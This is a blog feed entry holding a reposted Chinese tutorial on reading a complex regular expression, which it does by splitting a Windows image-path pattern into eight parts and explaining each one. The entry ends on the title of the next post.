  <entry>
    <title>如何教你看懂复杂的正则表达式[转载]</title>
    <url>/article/2e60da58.html</url>
    <content><![CDATA[<blockquote>
    原文链接:<a href="https://www.cnblogs.com/superstar/p/6638970.html" target="_blank" rel="noopener">https://www.cnblogs.com/superstar/p/6638970.html</a>
</blockquote>
<br>

<p>好久没更新了，是因为这几天都在学习python，渗透的学习也拖了一点。为什么老转载呢，这是个好问题<br>一、我所知道的知识还是太少了，总结的其实很不全面；<br>二、一些大神写得太具体了，这里转载一下，以后可以复习一下。<br>正则表达式我相信是每个渗透学习者入门所必须要学习的知识，并且也是一道很高的墙，有的正则表达式想要绕过去<br>还是很难的，这里转载了一篇大神所写的一篇文章，很好的描述了如何看懂复杂的正则表达式这里放上原文地址<br><a href="https://www.cnblogs.com/superstar/p/6638970.html" target="_blank" rel="noopener" class="LinkCard">如何教你看懂复杂的正则表达式</a></p>
<a id="more"></a>


<div id="cnblogs_post_body" class="blogpost-body ">
<p>【前言】</p>
<p>1.此文针对，正则表达式的初学者，老鸟请飘过。</p>
<p>正则表达式的初学者，常遇到的情况是，对于相对复杂一点的正则表达式，觉得很难理解，很难看懂。</p>
<p>2.此文目的，之前你看不懂，看了此教程后，就基本掌握了，看懂复杂正则表达式的思路。</p>
<p>这样就可以通过自己的能力，一点点把复杂的正则表达式，一点点拆分，一点点分析，知道完全理解。</p>
<p>3.在看此文之前，肯定需要你本身对于正则表达式，已经有了一些基本的基础，</p>
<p>比如知道点’.’表示任意字符，星号’*’表示0或多个之类的含义，这样才有看此文的基础。</p>
<p>&nbsp;</p>
<p>关于正则表达式方面的教程和资料，需要的可以去看我整理的一些资料：</p>
<p><a href="http://www.crifan.com/files/doc/docbook/regular_expression/release/html/regular_expression.html" target="_blank"><strong><span style="color: #ff0000;">正则表达式学习心得</span></strong></a></p>
<p><a href="http://www.crifan.com/detailed_explanation_about_python_regular_express" target="_blank"><strong><span style="color: #ff0000;">【教程】详解Python正则表达式</span></strong></a></p>
<p><a href="http://www.crifan.com/summary_regular_expression_csharp_python/" target="_blank">【总结】关于（C#和Python中的）正则表达式</a></p>
<p><a href="http://www.crifan.com/regular_expression_in_java_is_java_util_regex" target="_blank">java中的正则表达式：java.util.regex</a></p>
<p>&nbsp;</p>
<p>【如何看懂复杂的正则表达式】</p>
<p>基本思路：拆分-&gt;各个击破</p>
<p>解释：</p>
<p>先将一个，很长的，很复杂的正则表达式，从左向右，一点点读取，分析，一点找到某部分的内容，是一个逻辑概念上的独立的一块，就暂时拆分出来，如此，一点点把复杂的正则表达式，拆分成很多个逻辑上独立的小块，</p>
<p>然后针对每个小块的表达式，再去分析其含义</p>
<p>每个小块的正则表达式都搞懂后</p>
<p>把和所有的含义，合并出一个整体的含义</p>
<p>最后就可以实现，用人类的语言，把对应的复杂的正则表达式，一点点解释出来了，即：</p>
<p>把，之前看不懂的，复杂的正则表达式，翻译成，人类可以看懂读懂的语言（至少先让你自己读懂看懂）</p>
<p>&nbsp;</p>
<p>在举例分析之前，需要知道一些前提：</p>
<p>1.任何复杂的正则表达式，都是由写正则表达式的人，从简单到复杂一点点写出来的。</p>
<p>所以，理论上，如何读懂复杂的正则表达式，也就是一个反向解析的过程，即将复杂的拆分成多个简单的，功能上，逻辑是独立的子表达式，然后再去分析其含义，最终再合并出来整体的，复杂的含义。</p>
<p>2.正则表达式，即使各种语言的正则表达式的库函数，去解析的时候，也是从左到右，一点点分析，一点点拆分，将复杂的差分成多个子表达式，以实现，计算机语言内部，去理解此表达式的。</p>
<p>此处，只是通过人类的方式，手动从左到右，一点点分析而已，也算是和计算机语言识别正则的类似的过程。</p>
<p>3.虽然正则表达式，不同的语言，具体的写法，有些略微的差别，但是本质上的，绝大部分的正则表达式的写法，都是基本类似的。</p>
<p>&nbsp;</p>
<p>【举例说明，如何实现拆分复杂的正则表达式】</p>
<p>举例：</p>
<p><a href="http://zhidao.baidu.com/question/501645448.html" target="_blank">/^[A-Z]:\\{1,2}[^/:\*\?&lt;&gt;\|]+\.(jpg|gif|png|bmp)$/i正则表达式表示什么意思？</a></p>
<p>首先，对于拿到这个，看似很繁琐的字符串：</p>
<p><strong>/^[A-Z]:\\{1,2}[^/:\*\?&lt;&gt;\|]+\.(jpg|gif|png|bmp)$/i</strong></p>
<p>作为，相对比你熟悉正则的我，一看就知道，是PHP或Perl一类的语言中的正则表达式，因为这里是：</p>
<p>/xxx/i</p>
<p>的格式，其中xxx表示真正的正则表达式本身，而后面的i表示ignoreCase，即忽略大小写的意思。</p>
<p>而如果你只是熟悉其他如Python等语言的正则表达式，则此处无需太关心那两个斜杠，可以将其理解为，类似于Python中的这样的写法：</p>
<p>re.match("xxx", re.I)</p>
<p>其中的xxx，是此处真正的正则表达式：</p>
<p><strong><span style="color: #ff0000;">^[A-Z]:\\{1,2}[^/:\*\?&lt;&gt;\|]+\.(jpg|gif|png|bmp)$</span></strong></p>
<p>而re.I即re.IGNORECASE,表示忽略大小写的意思。</p>
<p>&nbsp;</p>
<p>接下来，就来分析此处的xxx，即：</p>
<p>^[A-Z]:\\{1,2}[^/:\*\?&lt;&gt;\|]+\.(jpg|gif|png|bmp)$</p>
<p>的完整的含义：</p>
<p>对于我来说，看到此正则表达式：</p>
<p>^[A-Z]:\\{1,2}[^/:\*\?&lt;&gt;\|]+\.(jpg|gif|png|bmp)$</p>
<p>后，我可以直接将其，按照之前所介绍的方法，直接拆分出对应，几个子表达式，其中每个子表达式，相对来说，是逻辑上独立的，或者是没关系，关系不大的各个小的正则表达式。</p>
<p>先说拆分的结果如下：</p>
<table style="width: 242px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="74">1</td>
<td valign="top" width="166">^</td>
</tr>
<tr>
<td valign="top" width="74">2</td>
<td valign="top" width="166">[A-Z]</td>
</tr>
<tr>
<td valign="top" width="74">3</td>
<td valign="top" width="166">:</td>
</tr>
<tr>
<td valign="top" width="74">4</td>
<td valign="top" width="166">\\{1,2}</td>
</tr>
<tr>
<td valign="top" width="74">5</td>
<td valign="top" width="166">[^/:\*\?&lt;&gt;\|]+</td>
</tr>
<tr>
<td valign="top" width="74">6</td>
<td valign="top" width="166">\.</td>
</tr>
<tr>
<td valign="top" width="74">7</td>
<td valign="top" width="166">(jpg|gif|png|bmp)</td>
</tr>
<tr>
<td valign="top" width="74">8</td>
<td valign="top" width="166">$</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>但是，作为读者的你，肯定看了会说，我怎么才能，像我这里一样，一次性就看出，如何将上述复杂的正则表达式，一下次分出这8部分，即（将上面那个复杂的正则表达式）大卸八块呢？^_^</p>
<p>那么此处，就来介绍一下，基本的思路，或者说，我是怎么实现此过程的：</p>
<p>【如何拆分正则表达式： ^[A-Z]:\\{1,2}[^/:\*\?&lt;&gt;\|]+\.(jpg|gif|png|bmp)$】</p>
<p>首先，看到这么一堆的复杂的字符，其实我也不可能立刻实现，全部拆分出来。</p>
<p>我也是一点点，像之前介绍的方法和思路一样，是从左到右，一点点去，识别，区分，然后一点点分出来这么多个子表达式，子部分的：</p>
<p>&nbsp;</p>
<p>1.比如，首先，我从左往右看的话，第一个看到的是’^’，对此，对于有了正则表达式最最基础的你，应该知道，这个是匹配字符串的开始的；</p>
<p>而很明显，对于’^’，此处，一般不会，此处也没有后面有啥限定符，即没有和其他字符，去搭配使用。</p>
<p>所以，此’^’，就是我们所拆分出来的，第一个，相对逻辑上独立的，子正则表达式，所以就可以写出第一个小子表达式了：</p>
<table style="width: 242px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="74">1</td>
<td valign="top" width="166">^</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>2.然后接着来分析，接下来是左中括号'[‘，而对于左中括号，还是那句话，作为已有正则表达式的基础的你，知道其，一般来说都是和另外一个右中括号’]’去搭配使用，并且左右中括号里面，也会有一些字符，以表示中括号内的字符，所组成的集合，即类似于[xxx]的形式，对此，接着往后看，可以说，此处还是很简单的，就看到了后面还有’A-Z]’，正好和'[‘组成了'[A-Z]’，正好符合我们所理解和期望的[xxx]的形式。</p>
<p>而此处，很明显，就是A-Z，对应着正则表达式的语法，在中括号内，可以通过短横线链接起始字符，表示一段范围内的字符，此处即通过A-Z表示，A，B，C，。。。，X，Y，Z，这26个大写字母。</p>
<p>所以，此处，看似，也就很清楚了，觉得第二个子正则表达式，就是[A-Z]了。</p>
<p>而作为比你经验稍多的我，要告诉你，其实你此处这样的想法，是严谨的，因为，对于，中括号内部表示字符集合，[xxx]的写法，往往后面还会跟着一些限定符，去表示此集合字符的个数方面的限定，比如加号’+’表示去匹配，往后数，尽可能多个，比如表示最少2个，最多5个的'{2,5}’等等。</p>
<p>而此处呢，算是巧了，后面实际上，是没有这类限定符的，因为我们看到了，后面只有冒号’:’，而冒号，此处，正如按照正常逻辑所理解的一样，就是表示匹配冒号字符’:’本身而已。</p>
<p>所以，此处，由于巧了，后面没有字符个数方面的限定符，所以，第二个子正则表达式，正好就是[A-Z]本身而已，所以，接着写出，我们已经拆分出来的，共两个子正则表达式了：</p>
<table style="width: 242px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="74">1</td>
<td valign="top" width="166">^</td>
</tr>
<tr>
<td valign="top" width="74">2</td>
<td valign="top" width="166">[A-Z]</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>3.上面已经分析了，此处后面跟着的字符，是冒号这个字符’:’，同理，由于后面没有看到其他的加号’+’之类的限定符，所以此处，冒号本身，就是表示一个完整的子正则表达式，去匹配单个的冒号了。</p>
<p>所以，此处第三个，子正则表达式也就是此冒号字符本身了。所以，现在共拆分出来三个子正则表达式了：</p>
<table style="width: 242px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="74">1</td>
<td valign="top" width="166">^</td>
</tr>
<tr>
<td valign="top" width="74">2</td>
<td valign="top" width="166">[A-Z]</td>
</tr>
<tr>
<td valign="top" width="74">3</td>
<td valign="top" width="166">:</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>4.可以看到，冒号后面是个反斜杠’\’，而看到反斜杠，作为已了解正则表达式的语法的你，应该知道，正则表达式中，会有很多’\x’其中x是某个字母的形式，而不同的字符，组合出来的，表示不同的各种含义，比如常见的\d表示数字0-9等等。</p>
<p>而此处，看到的是反斜杠后面’\’后面，又跟了个反斜杠’\’，对此，根据正则表达式的语法，则是表示反斜杠这个字符本身，就是想要去匹配一段字符串中，是否有反斜杠这个字符本身。</p>
<p>然后接着往后看，是{1,2}，很明显，是之前已提到多次的，限定符，作用是，限制（前面的字符的）个数是，至少1个，最多2个。所以此处就是去限定前面的，反斜杠字符本身，所以加起来，就是<a href="file://%7B1%2C2/">\\{1,2</a>}，而对应的含义也就是</p>
<p>去匹配，至少一个反斜杠，最多2个反斜杠。</p>
<p>所以，目前已拆分出共4个子表达式了：</p>
<table style="width: 242px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="74">1</td>
<td valign="top" width="166">^</td>
</tr>
<tr>
<td valign="top" width="74">2</td>
<td valign="top" width="166">[A-Z]</td>
</tr>
<tr>
<td valign="top" width="74">3</td>
<td valign="top" width="166">:</td>
</tr>
<tr>
<td valign="top" width="74">4</td>
<td valign="top" width="166"><a href="file://%7B1%2C2/">\\{1,2</a>}</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>5.再往后面分析，是左中括号'[‘，根据正则表达式的语法，和前面已经讨论过一次中括号的用法，我们可以知道，后面一定还有一个右中括号，所以，把左右中括号，以及中间内容，都一起写出来，就是：</p>
<p>[^/:\*\?&lt;&gt;\|]</p>
<p>但是，对于中括号中间的这么一堆字符：</p>
<p>^/:\*\?&lt;&gt;\|</p>
<p>至少看起来，也还是比较复杂的。</p>
<p>再但是呢，对于已经了解正则表达式语法的你，应该知道，中括号内，表示取反的写法是，对应的字符或字符集，在其前面，添加上那个特殊字符，向上的箭头，此处叫做插入字符’^’，表示针对某个，或某些字符，取反的意思，即匹配除了这些字符之外的那些字符。</p>
<p>而此处，就是对应的</p>
<p>对于</p>
<p>/:\*\?&lt;&gt;\|</p>
<p>前面加上个插入符号’^’，变成：</p>
<p>^/:\*\?&lt;&gt;\|</p>
<p>表示，匹配，除了 字符组合：</p>
<p>/:\*\?&lt;&gt;\|</p>
<p>之外的字符。</p>
<p>而此处的字符组合：</p>
<p>/:\*\?&lt;&gt;\|</p>
<p>其实就是一堆的字符，一点点写出来的，其详细含义，我们后续再分析。</p>
<p>&nbsp;</p>
<p>此处还没完，因为此处的[^xxx]的形式之后，还有个加号’+’，对应含义也很明确，就是前面那种字符，即除了/:\*\?&lt;&gt;\|之外的字符，的个数，此处通过加号去限定为，至少是1个，可以更多个，即&gt;=1的个数。</p>
<p>所以，算是[^xxx]+的形式了，其中xxx是/:\*\?&lt;&gt;\|</p>
<p>&nbsp;</p>
<p>因此，此处已经共分析出5个子表达式了：</p>
<table style="width: 242px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="74">1</td>
<td valign="top" width="166">^</td>
</tr>
<tr>
<td valign="top" width="74">2</td>
<td valign="top" width="166">[A-Z]</td>
</tr>
<tr>
<td valign="top" width="74">3</td>
<td valign="top" width="166">:</td>
</tr>
<tr>
<td valign="top" width="74">4</td>
<td valign="top" width="166">\\{1,2}</td>
</tr>
<tr>
<td valign="top" width="74">5</td>
<td valign="top" width="166">[^/:\*\?&lt;&gt;\|]+</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>6.再往后看，就是一个反斜杠’\’加上一个点’.’，即’\.’，其表示点字符本身，这点你也应该在学习正则表达式基本语法的时候，有所了解。</p>
<p>此处再多解释一句就是，之所以不直接写点’.’，是因为字符点’.’本身，在正则表达式中，是匹配任意一个单个字符的意思，而想要匹配这样的，在正则表达式中被用于表示的含义的字符的时候，就需要用到反斜杠，反斜杠用来表示所谓的转义。</p>
<p>在正则表达式中，常见的就有：</p>
<table style="width: 604px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="82"><span style="color: #0000ff;"><strong>特殊字符</strong></span></td>
<td valign="top" width="293"><span style="color: #0000ff;"><strong>正则表达式中所代表的特殊含义</strong></span></td>
<td valign="top" width="227"><span style="color: #0000ff;"><strong>想要匹配对应的字符本身的写法</strong></span></td>
</tr>
<tr>
<td valign="top" width="82">.</td>
<td valign="top" width="293">任意单个字符</td>
<td valign="top" width="227">\.</td>
</tr>
<tr>
<td valign="top" width="82">?</td>
<td valign="top" width="293">限定符，表示0或1个</td>
<td valign="top" width="227">\?</td>
</tr>
<tr>
<td valign="top" width="82">*</td>
<td valign="top" width="293">限定符，0或多个</td>
<td valign="top" width="227">\*</td>
</tr>
<tr>
<td valign="top" width="82">( , )</td>
<td valign="top" width="293">左右括号联合起来，表示一个group组</td>
<td valign="top" width="227">\( , \)</td>
</tr>
<tr>
<td valign="top" width="82">[ , ]</td>
<td valign="top" width="293">左右中括号括起来，表示字符集合</td>
<td valign="top" width="227">\[ ,&nbsp; \]</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>因此，此处一共已拆分出6个子正则表达式了：</p>
<table style="width: 242px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="74">1</td>
<td valign="top" width="166">^</td>
</tr>
<tr>
<td valign="top" width="74">2</td>
<td valign="top" width="166">[A-Z]</td>
</tr>
<tr>
<td valign="top" width="74">3</td>
<td valign="top" width="166">:</td>
</tr>
<tr>
<td valign="top" width="74">4</td>
<td valign="top" width="166">\\{1,2}</td>
</tr>
<tr>
<td valign="top" width="74">5</td>
<td valign="top" width="166">[^/:\*\?&lt;&gt;\|]+</td>
</tr>
<tr>
<td valign="top" width="74">6</td>
<td valign="top" width="166">\.</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>7.再往后看，后面是一个左括号'(‘，很明显，此处后面肯定有一个右括号，和此处的左括号联合起来，表示一个组group。</p>
<p>此处，很简单，就可以看出来是</p>
<p>(jpg|gif|png|bmp)</p>
<p>注：更复杂的正则表达式，可能会出现多个group嵌套的情况，即括号内嵌套括号的情况，此时，此种拆分方法仍然有效，还是找到最开始的左括号，此时对于括号层次来说肯定是最外层，所匹配的那个的最外层的右括号，那这一部分拿出来，继续分析即可。如果存在更多曾的括号嵌套括号，仍然是找到对应匹配的括号即可。</p>
<p>而对于此处的group组：</p>
<p>(jpg|gif|png|bmp)</p>
<p>的含义，后面再详细分析。</p>
<p>此时，也已经拆分出来，共7个子表达式了：</p>
<table style="width: 242px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="74">1</td>
<td valign="top" width="166">^</td>
</tr>
<tr>
<td valign="top" width="74">2</td>
<td valign="top" width="166">[A-Z]</td>
</tr>
<tr>
<td valign="top" width="74">3</td>
<td valign="top" width="166">:</td>
</tr>
<tr>
<td valign="top" width="74">4</td>
<td valign="top" width="166">\\{1,2}</td>
</tr>
<tr>
<td valign="top" width="74">5</td>
<td valign="top" width="166">[^/:\*\?&lt;&gt;\|]+</td>
</tr>
<tr>
<td valign="top" width="74">6</td>
<td valign="top" width="166">\.</td>
</tr>
<tr>
<td valign="top" width="74">7</td>
<td valign="top" width="166">(jpg|gif|png|bmp)</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>8.最后，还剩下一个美元符号’$’，表示匹配字符串末尾，这个很好理解。不多解释。</p>
<p>此时，就已经实现了，把上述的一个复杂的正则表达式，拆分成多个逻辑上独立的，共8个，子正则表达式了：</p>
<table style="width: 242px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="74">1</td>
<td valign="top" width="166">^</td>
</tr>
<tr>
<td valign="top" width="74">2</td>
<td valign="top" width="166">[A-Z]</td>
</tr>
<tr>
<td valign="top" width="74">3</td>
<td valign="top" width="166">:</td>
</tr>
<tr>
<td valign="top" width="74">4</td>
<td valign="top" width="166">\\{1,2}</td>
</tr>
<tr>
<td valign="top" width="74">5</td>
<td valign="top" width="166">[^/:\*\?&lt;&gt;\|]+</td>
</tr>
<tr>
<td valign="top" width="74">6</td>
<td valign="top" width="166">\.</td>
</tr>
<tr>
<td valign="top" width="74">7</td>
<td valign="top" width="166">(jpg|gif|png|bmp)</td>
</tr>
<tr>
<td valign="top" width="74">8</td>
<td valign="top" width="166">$</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>看到这里，对于如何从左往右看，一点点根据逻辑组合，去拆分成多个子表达式，的总体方法和思路，应该大概清楚了。</p>
<p>余下的事情，就是自己通过多读多看多学习，去了解别人写的正则表达式，用此套分析方法，去拆分了。</p>
<p>知道了方法，加上尽量多的练习，自然会对正则表达式，越来越熟悉，越来越理解的。</p>
<p>&nbsp;</p>
<p>此处，对于此正则表达式的分析，还没完。因为还有几个字正则表达式的含义，没有完全分析透彻。</p>
<p>下面先来总结一下，已经知道的，各个子表达式的含义：</p>
<table style="width: 682px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="71"><strong><span style="color: #0000ff;">子正则表达式序号</span></strong></td>
<td valign="top" width="134"><strong><span style="color: #0000ff;">子正则表达式内容</span></strong></td>
<td valign="top" width="261"><strong><span style="color: #0000ff;">子正则表达式的含义</span></strong></td>
<td valign="top" width="214"><strong><span style="color: #0000ff;">仍需后续分析的部分子表达式</span></strong></td>
</tr>
<tr>
<td valign="top" width="71">1</td>
<td valign="top" width="134">^</td>
<td valign="top" width="261">匹配字符串的开始</td>
<td valign="top" width="214">&nbsp;</td>
</tr>
<tr>
<td valign="top" width="71">2</td>
<td valign="top" width="134">[A-Z]</td>
<td valign="top" width="261">匹配单个字符，此单个字符可能是A-Z中的任何一个</td>
<td valign="top" width="214">&nbsp;</td>
</tr>
<tr>
<td valign="top" width="71">3</td>
<td valign="top" width="134">:</td>
<td valign="top" width="261">匹配冒号字符’:’本身</td>
<td valign="top" width="214">&nbsp;</td>
</tr>
<tr>
<td valign="top" width="71">4</td>
<td valign="top" width="134">\\{1,2}</td>
<td valign="top" width="261">匹配反斜杠字符，最少1个，最多2个</td>
<td valign="top" width="214">&nbsp;</td>
</tr>
<tr>
<td valign="top" width="71">5</td>
<td valign="top" width="134">[^/:\*\?&lt;&gt;\|]+</td>
<td valign="top" width="261">匹配除了 /:\*\?&lt;&gt;\| 之外的其他字符，个数上则是尽可能多个</td>
<td valign="top" width="214">/:\*\?&lt;&gt;\| 的含义</td>
</tr>
<tr>
<td valign="top" width="71">6</td>
<td valign="top" width="134">\.</td>
<td valign="top" width="261">匹配字符点’.’本身</td>
<td valign="top" width="214">&nbsp;</td>
</tr>
<tr>
<td valign="top" width="71">7</td>
<td valign="top" width="134">(jpg|gif|png|bmp)</td>
<td valign="top" width="261">匹配group，group内部是jpg|gif|png|bmp</td>
<td valign="top" width="214">jpg|gif|png|bmp 的含义</td>
</tr>
<tr>
<td valign="top" width="71">8</td>
<td valign="top" width="134">$</td>
<td valign="top" width="261">匹配正则表达式的末尾</td>
<td valign="top" width="214">&nbsp;</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>很明显，还剩两个我们没有分析，下面就来详细分析解释其含义：</p>
<p>1./:\*\?&lt;&gt;\| 的含义</p>
<p>其实，理论上，对于这样的字符串：</p>
<p>/:\*\?&lt;&gt;\|</p>
<p>其实也是继续将其按照上述方法，去将其拆分为不同的子表达式。</p>
<p>只是由于此处看似复杂，其实还是很简单，所以，直接分析一下，即可看出其含义。就不详细拆分了。</p>
<p>此处，根据字符本身含义，依次是：</p>
<table style="width: 469px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="128">/</td>
<td valign="top" width="339">斜杠字符本身</td>
</tr>
<tr>
<td valign="top" width="128">:</td>
<td valign="top" width="339">冒号字符本身</td>
</tr>
<tr>
<td valign="top" width="128">\*</td>
<td valign="top" width="339">星号字符’*’本身</td>
</tr>
<tr>
<td valign="top" width="128">\?</td>
<td valign="top" width="339">问号字符’?’本身</td>
</tr>
<tr>
<td valign="top" width="128">&lt;</td>
<td valign="top" width="339">小于号字符'&lt;‘本身</td>
</tr>
<tr>
<td valign="top" width="128">&gt;</td>
<td valign="top" width="339">大于号字符’&gt;’本身</td>
</tr>
<tr>
<td valign="top" width="128">\|</td>
<td valign="top" width="339">竖线字符’|’本身</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>所以，此部分</p>
<p>&nbsp;</p>
<p>的总体含义就是：</p>
<p>字符，斜杠，冒号，星号，问号，小于号，大于号，竖线，这些字符（集合）</p>
<p>而放到[^xxx]里面，变成：</p>
<p>[^/:\*\?&lt;&gt;\|]</p>
<p>的意思就是</p>
<p>除了字符：</p>
<p>斜杠，冒号，星号，问号，小于号，大于号，竖线</p>
<p>这些字符之外的，其他的任意字符</p>
<p>而再加上之前的加号’+’去限定其个数是最少1个，&gt;=1个，变成：</p>
<p>[^/:\*\?&lt;&gt;\|]+</p>
<p>所表示的意思就很清楚了：</p>
<p>去匹配 尽可能多个字符，这些字符是：</p>
<p>除了字符：</p>
<p>斜杠，冒号，星号，问号，小于号，大于号，竖线</p>
<p>之外的，其他的任意的字符</p>
<p>&nbsp;</p>
<p>到此，对此</p>
<p>[^/:\*\?&lt;&gt;\|]+</p>
<p>的含义，才算基本明确。</p>
<p>而如果你本身对于windows等操作系统对于文件名或者路径字符的限制有了解的话，你会发现，这基本上就是</p>
<p>我们所常见的，对于你在windows中，问文件或文件夹命名时，其所提示的，不允许你名字中包含这类：</p>
<p>斜杠，冒号，星号，问号，小于号，大于号，竖线</p>
<p>即：</p>
<p>/,:,*,?,&lt;,&gt;,|</p>
<p>&nbsp;</p>
<p>而此时，如果你稍微会点举一反三/触类旁通的思想的话，就会联想到，此处去匹配的东西，很可能是文件或文件夹的名字方面的东西。</p>
<p>&nbsp;</p>
<p>2.jpg|gif|png|bmp 的含义</p>
<p>此处的正则表达式，很明显看出就是：</p>
<p>xxx|xxx|xxx</p>
<p>的格式，其中xxx分别是，具有不同可能的字符串，即多个可能性之一</p>
<p>对应的，其所表达的意思是，去匹配：</p>
<p>要么是jpg，要么是gif，要么是png，要么是bmp</p>
<p>（除了这几种可能外，其他的都不匹配）</p>
<p>&nbsp;</p>
<p>对于这种匹配多种可能性的正则的写法，想要深入了解的话，可以参考教程：</p>
<p><a href="http://www.crifan.com/detailed_explanation_about_python_regular_express_about_vertical_bar/" target="_blank">【教程】详解Python正则表达式之： ‘|’ vertical bar 竖杠</a></p>
<p>&nbsp;</p>
<p>所以，此时，我们就可以把每部分的内容的含义，都完整分析出来了：</p>
<table style="width: 612px;" border="1" cellspacing="0" cellpadding="2">
<tbody>
<tr>
<td valign="top" width="108"><strong><span style="color: #0000ff;">子正则表达式序号</span></strong></td>
<td valign="top" width="183"><strong><span style="color: #0000ff;">子正则表达式内容</span></strong></td>
<td valign="top" width="319"><strong><span style="color: #0000ff;">子正则表达式的含义</span></strong></td>
</tr>
<tr>
<td valign="top" width="123">1</td>
<td valign="top" width="200">^</td>
<td valign="top" width="335">匹配字符串的开始</td>
</tr>
<tr>
<td valign="top" width="130">2</td>
<td valign="top" width="206">[A-Z]</td>
<td valign="top" width="336">匹配单个字符，此单个字符可能是A-Z中的任何一个</td>
</tr>
<tr>
<td valign="top" width="134">3</td>
<td valign="top" width="210">:</td>
<td valign="top" width="331">匹配冒号字符’:’本身</td>
</tr>
<tr>
<td valign="top" width="136">4</td>
<td valign="top" width="213">\\{1,2}</td>
<td valign="top" width="329">匹配反斜杠字符，最少1个，最多2个</td>
</tr>
<tr>
<td valign="top" width="136">5</td>
<td valign="top" width="215">[^/:\*\?&lt;&gt;\|]+</td>
<td valign="top" width="328">匹配 &gt;=1个，但尽可能多的，除了斜杠，冒号，星号，问号，小于号，大于号，竖线之外的其他的任意字符</td>
</tr>
<tr>
<td valign="top" width="136">6</td>
<td valign="top" width="217">\.</td>
<td valign="top" width="327">匹配字符点’.’本身</td>
</tr>
<tr>
<td valign="top" width="135">7</td>
<td valign="top" width="218">(jpg|gif|png|bmp)</td>
<td valign="top" width="326">匹配要么是jpg，要么是gif，要么是png，要么是bmp</td>
</tr>
<tr>
<td valign="top" width="135">8</td>
<td valign="top" width="219">$</td>
<td valign="top" width="325">匹配正则表达式的末尾</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>所以，把这些各个子正则的含义，连接在一起，就可以用语言表示为：</p>
<p>去匹配一个字符串，</p>
<p>该字符串，开头部分，就一个字母，该字母可能是从A到Z的任何一个字母，</p>
<p>后面跟着一个冒号，</p>
<p>再后面是1个或2个反斜杠，</p>
<p>然后是至少一个，但尽量多的，除了斜杠，冒号，星号，问号，小于号，大于号，竖线之外的其他的任意字符，</p>
<p>然后是字符点，</p>
<p>然后以jpg，gif，png，bmp中的其中一个而结尾</p>
<p>&nbsp;</p>
<p>而对应的，由于之前还有flag标志，表示忽略大小写，则所匹配的内容，就是上述内容的表述，再加上一个，期间部分大小写，就可以了。</p>
<p>所以，最终所要表述的含义就是：</p>
<p>去匹配一个字符串， 期间字母不分大小写，</p>
<p>该字符串，开头部分，就一个字母，该字母可能是从A到Z的任何一个字母，</p>
<p>后面跟着一个冒号，</p>
<p>再后面是1个或2个反斜杠，</p>
<p>然后是至少一个，但尽量多的，除了斜杠，冒号，星号，问号，小于号，大于号，竖线之外的其他的任意字符，</p>
<p>然后是字符点，</p>
<p>然后以jpg，gif，png，bmp中的其中一个而结尾</p>
<p>&nbsp;</p>
<p>由此，我们可以随便写出来一个，符合该规则的字符串，比如：</p>
<p>a:\123abc.jpg</p>
<p>a:\\123abc.bmp</p>
<p>a:\\123abcdef.jpg</p>
<p>A:\\123abcdef.jpg</p>
<p>E:\\abc123.png</p>
<p>等等，诸如此类的字符串。</p>
<p>&nbsp;</p>
<p>此时，已可很明显看出来其用意了，其就是要去匹配：</p>
<p>Windows类系统（如XP，Win7等）中，本地的某个磁盘分区根目录下的某张图片而已。</p>
<p>&nbsp;</p>
<p>至此，算是完整的，从开始的，无法用肉眼一眼就看出来含义的，那个复杂的，正则表达式，将其一点点拆分，分成多个子表达式，各个击破其子表达式的含义，最终再把每个子表达式的含义合成在一起，再加上对应的flag标志的影响，最终生成了复杂表达式的最终含义，以及，用文字描述出来，最终，领悟和理解，原始的正则表达式，所要表示的含义。</p>
<p>&nbsp;</p>
<p>通过此分析过程可见，其实再复杂的表达式，也都是可以通过拆分的方法，由繁化简，而逐个击破，了解细节的含义，再整合出宏观上的整体的含义，最终搞懂完整的表达式的含义的。</p>
<p>只是过程，或繁或简，取决于表达式本身的复杂程度，以及你本身所对正则表达式的理解和掌握的程度。</p>
<p>&nbsp;</p>
<p>【总结】</p>
<span style="color: #ff0000;"><p>千言万语总结出几句话：</p>
<p>1. 对于复杂的正则表达式，即使从左往右，一点点分析，拆分出多个子正则表达式，然后各个击破，搞懂其含义，最后再合成一个总体的含义，即可实现，将复杂的正则表达式，翻译成人类可以读懂的含义了。</p>
<p>2.再复杂的正则表达式，花足够的时间去分析，都是能搞懂的。 只不过具体要花多长时间，则因人而异。</p>
<p>3.想要尽快的，准确的理解原正则表达式所要描述的含义，还是要多多练习，最终达到熟能生巧，以至于触类旁通的效果。</p>
</div></span></p>]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title>学外语是如何毁了我[B站]</title>
    <url>/article/1ed1bfc3.html</url>
